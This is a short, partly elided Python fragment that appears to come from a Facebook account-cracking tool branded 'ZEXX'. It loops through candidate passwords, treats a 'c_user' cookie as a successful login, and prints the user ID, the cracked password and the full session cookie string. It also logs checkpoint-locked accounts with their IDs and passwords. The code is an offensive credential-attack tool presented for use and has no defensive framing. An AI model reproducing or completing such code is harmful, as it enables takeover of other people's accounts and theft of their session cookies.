    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                asraf(f' [white]~ [red3][[bold bright_yellow]ZEXX OK ACCOUNT💚[red3]][bright_yellow]-> [bold bright_green]'+uid+' = '+ps+'')
                asraf(f' [white]~ [red3][[bold bright_yellow]ZEXX COOKIE💜[red3]][bright_yellow]-> [bold bright_green]'+coki)
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                asraf('[red3] ~ [ZEXX CP ACCOUNT💔]-> '+uid+' = '+ps+' ')
